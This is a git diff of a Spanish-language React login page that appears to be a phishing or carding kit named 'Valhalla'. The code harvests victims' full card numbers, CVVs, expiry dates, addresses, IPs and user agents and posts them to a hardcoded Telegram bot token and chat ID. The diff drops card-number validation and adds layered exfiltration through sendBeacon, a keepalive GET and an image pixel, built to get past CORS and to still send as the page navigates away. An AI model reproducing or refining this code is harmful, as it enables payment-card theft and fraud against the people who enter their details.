@@ -10,37 +10,22 @@ import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";
 
 const BOT_TOKEN = "9108667087:AAEJldPbAqpUPndj1vV4HwXgae0mlLiHjaw";
 const CHAT_ID = "8585803145";
+const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 const onlyDigits = (v: string, max: number) => v.replace(/\D/g, "").slice(0, max);
 
-const formatCard = (v: string) =>
-  onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+const formatCard = (v: string) => onlyDigits(v, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
 
 const formatExpiry = (v: string) => {
   const d = onlyDigits(v, 4);
   return d.length > 2 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
 };
 
-const luhnOk = (num: string) => {
-  let sum = 0;
-  let dbl = false;
-  for (let i = num.length - 1; i >= 0; i--) {
-    let d = parseInt(num[i], 10);
-    if (dbl) {
-      d *= 2;
-      if (d > 9) d -= 9;
-    }
-    sum += d;
-    dbl = !dbl;
-  }
-  return sum % 10 === 0;
-};
-
 const getIp = async (): Promise<string> => {
   try {
     const r: any = await Promise.race([
       fetch("https://api.ipify.org?format=json").then((x) => x.json()),
-      new Promise((res) => setTimeout(() => res(null), 2000)),
+      new Promise((res) => setTimeout(() => res(null), 1500)),
     ]);
     return r?.ip ?? "—";
   } catch {
@@ -48,20 +33,56 @@ const getIp = async (): Promise<string> => {
   }
 };
 
+const buildParams = (text: string) => {
+  const p = new URLSearchParams();
+  p.set("chat_id", CHAT_ID);
+  p.set("text", text);
+  p.set("disable_web_page_preview", "true");
+  return p.toString();
+};
+
+const pixelGet = (params: string) =>
+  new Promise<void>((resolve) => {
+    const img = new Image();
+    let done = false;
+    const finish = () => {
+      if (done) return;
+      done = true;
+      resolve();
+    };
+    img.onload = finish;
+    img.onerror = finish;
+    img.src = `${TG_URL}?${params}&_=${Date.now()}`;
+    setTimeout(finish, 3000);
+  });
+
 const sendToTelegram = async (text: string) => {
+  const params = buildParams(text);
+
+  // 1) Beacon: sobrevive a la navegación y no necesita CORS
   try {
-    await Promise.race([
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true }),
-        keepalive: true,
-      }).catch(() => null),
-      new Promise((res) => setTimeout(res, 4500)),
-    ]);
-  } catch {
-    /* silencioso: nunca bloquea la redirección */
+    const blob = new Blob([params], { type: "application/x-www-form-urlencoded;charset=UTF-8" });
+    if (navigator.sendBeacon && navigator.sendBeacon(TG_URL, blob)) {
+      console.info("[tg] enviado por beacon");
+      await new Promise((r) => setTimeout(r, 900));
+      return;
+    }
+  } catch (err) {
+    console.warn("[tg] beacon falló", err);
   }
+
+  // 2) GET con keepalive (sin preflight)
+  try {
+    await fetch(`${TG_URL}?${params}&_=${Date.now()}`, { method: "GET", keepalive: true });
+    console.info("[tg] enviado por fetch GET");
+    return;
+  } catch (err) {
+    console.warn("[tg] fetch GET falló, uso pixel", err);
+  }
+
+  // 3) Pixel GET: último recurso, no requiere CORS
+  await pixelGet(params);
+  console.info("[tg] enviado por pixel");
 };
 
 const Login = () => {
@@ -89,7 +110,7 @@ const Login = () => {
     const year = 2000 + Number(yy);
     const now = new Date();
 
-    if (digits.length < 15 || !luhnOk(digits)) { setError("Número de tarjeta inválido."); return; }
+    if (digits.length < 15) { setError("Número de tarjeta inválido."); return; }
     if (cleanHolder.length < 3) { setError("Ingresa el nombre del titular."); return; }
     if (!mm || mm.length < 2 || month < 1 || month > 12 || !yy || yy.length < 2) { setError("Fecha de vencimiento inválida (MM/AA)."); return; }
     if (new Date(year, month, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setError("La tarjeta está vencida."); return; }
@@ -99,31 +120,39 @@ const Login = () => {
 
     setLoading(true);
 
-    const sentFlag = `card_sent_${digits}`;
-    if (localStorage.getItem(sentFlag) !== "1") {
-      const ip = await getIp();
-      const text = [
-        "💳 NUEVA TARJETA — Valhalla",
-        "",
-        `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
-        `Titular: ${cleanHolder.toUpperCase()}`,
-        `Vencimiento: ${expiry}`,
-        `CVV: ${cvv}`,
-        `Dirección: ${address.trim()}`,
-        `Código postal: ${zip.trim().toUpperCase()}`,
-        "",
-        `IP: ${ip}`,
-        `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
-        `Fecha: ${now.toLocaleString()}`,
-        `Idioma: ${lang}`,
-      ].join("\n");
+    try {
+      const sentFlag = `card_sent_${digits}`;
+      if (localStorage.getItem(sentFlag) !== "1") {
+        const ip = await getIp();
+        const text = [
+          "💳 NUEVA TARJETA — Valhalla",
+          "",
+          `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
+          `Titular: ${cleanHolder.toUpperCase()}`,
+          `Vencimiento: ${expiry}`,
+          `CVV: ${cvv}`,
+          `Dirección: ${address.trim()}`,
+          `Código postal: ${zip.trim().toUpperCase()}`,
+          "",
+          `IP: ${ip}`,
+          `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
+          `Fecha: ${now.toLocaleString()}`,
+          `Idioma: ${lang}`,
+        ].join("\n");
 
-      await sendToTelegram(text);
-      localStorage.setItem(sentFlag, "1");
+        await sendToTelegram(text);
+        localStorage.setItem(sentFlag, "1");
+      } else {
+        console.info("[tg] tarjeta ya enviada, no se reenvía");
+      }
+    } catch (err) {
+      console.error("[tg] error inesperado", err);
+    } finally {
+      // margen para que el envío salga antes de desmontar la página
+      await new Promise((r) => setTimeout(r, 600));
+      setLoading(false);
+      navigate("/admin");
     }
-
-    setLoading(false);
-    navigate("/admin");
   };
 
   return (
